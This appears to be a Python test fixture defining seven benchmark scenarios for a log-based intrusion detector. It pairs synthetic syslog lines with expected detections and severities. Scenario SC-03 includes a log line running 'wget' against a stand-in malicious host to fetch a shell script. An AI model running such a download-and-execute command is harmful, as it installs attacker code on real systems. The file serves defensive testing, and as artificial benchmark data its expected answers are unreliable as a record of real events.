# Known injected threats and expected detections
BENCHMARK_SCENARIOS = [
    {
        "scenario_id": "SC-01",
        "name": "SSH Brute Force Campaign",
        "injected_logs": [
            f"Apr 29 10:{i:02d}:00 host sshd[100{i}]: Failed password for admin from 203.0.113.10 port 22 ssh2"
            for i in range(60)
        ],
        "expected_detections": ["brute_force_ssh"],
        "expected_severity": "HIGH",
    },
    {
        "scenario_id": "SC-02", 
        "name": "Root Login Success",
        "injected_logs": [
            "Apr 29 11:00:00 host sshd[2000]: Accepted password for root from 198.51.100.7 port 22 ssh2"
        ],
        "expected_detections": ["successful_root_login"],
        "expected_severity": "CRITICAL",
    },
    {
        "scenario_id": "SC-03",
        "name": "Malware Process Execution",
        "injected_logs": [
            "Apr 29 11:01:00 host kernel: wget http://malicious.site/shell.sh"
        ],
        "expected_detections": ["malware_process"],
        "expected_severity": "CRITICAL",
    },
    {
        "scenario_id": "SC-04",
        "name": "Privilege Escalation",
        "injected_logs": [
            "Apr 29 11:02:00 host sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 user=ubuntu"
        ],
        "expected_detections": ["privilege_escalation"],
        "expected_severity": "HIGH",
    },
    {
        "scenario_id": "SC-05",
        "name": "New Account Created",
        "injected_logs": [
            "Apr 29 11:03:00 host useradd[999]: new user name=backdoor"
        ],
        "expected_detections": ["new_account_created"],
        "expected_severity": "MEDIUM",
    },
    {
        "scenario_id": "SC-06",
        "name": "Multi-Stage Attack (Brute Force + Root Login)",
        "injected_logs": [
            f"Apr 29 12:{i:02d}:00 host sshd[{1000+i}]: Failed password for root from 10.0.0.5 port 22 ssh2"
            for i in range(30)
        ] + [
            "Apr 29 12:31:00 host sshd[2000]: Accepted password for root from 10.0.0.5 port 22 ssh2"
        ],
        "expected_detections": ["brute_force_ssh", "ssh_root_attempt", "successful_root_login"],
        "expected_severity": "CRITICAL",
    },
    {
        "scenario_id": "SC-07",
        "name": "Clean System (No Threats)",
        "injected_logs": [
            "Apr 29 13:00:00 host sshd[100]: Accepted publickey for ubuntu from 192.168.1.1 port 22 ssh2",
            "Apr 29 13:01:00 host systemd[1]: Started Daily apt upgrade and clean activities.",
        ],
        "expected_detections": [],
        "expected_severity": "LOW",
    },
]